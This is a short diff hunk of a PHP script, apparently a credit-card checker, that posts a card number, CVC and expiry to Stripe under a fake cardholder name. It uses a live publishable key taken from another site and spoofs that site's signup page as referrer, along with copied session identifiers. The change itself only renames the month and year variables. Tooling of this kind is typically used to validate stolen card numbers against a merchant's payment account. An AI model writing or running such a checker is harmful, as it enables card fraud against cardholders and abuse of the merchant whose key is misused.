@@ -87,7 +87,7 @@ curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
 curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
 //========================================================================================================================//
 //========================================================================================================================//
-curl_setopt($ch, CURLOPT_POSTFIELDS, 'card[name]=Jose+Pala&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mon.'&card[exp_year]='.$year.'&guid=4f24bb03-49d8-42df-aeea-42376fe683b85c0984&muid=aed25126-ae8b-433d-bf91-f012ecc1734378ea5b&sid=63a13e5e-d216-485b-9521-eec80d4c60db8223bc&payment_user_agent=stripe.js%2F8a047bb8%3B+stripe-js-v3%2F8a047bb8&time_on_page=16384&referrer=https%3A%2F%2Fjoingolocal.com%2Fsignup%2F&key=pk_live_heCZDmBS7yf3RDcM400mYP7700KwxhHUOX');
+curl_setopt($ch, CURLOPT_POSTFIELDS, 'card[name]=Jose+Pala&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=4f24bb03-49d8-42df-aeea-42376fe683b85c0984&muid=aed25126-ae8b-433d-bf91-f012ecc1734378ea5b&sid=63a13e5e-d216-485b-9521-eec80d4c60db8223bc&payment_user_agent=stripe.js%2F8a047bb8%3B+stripe-js-v3%2F8a047bb8&time_on_page=16384&referrer=https%3A%2F%2Fjoingolocal.com%2Fsignup%2F&key=pk_live_heCZDmBS7yf3RDcM400mYP7700KwxhHUOX');
 //========================================================================================================================//
 //========================================================================================================================//
 $result = curl_exec($ch);
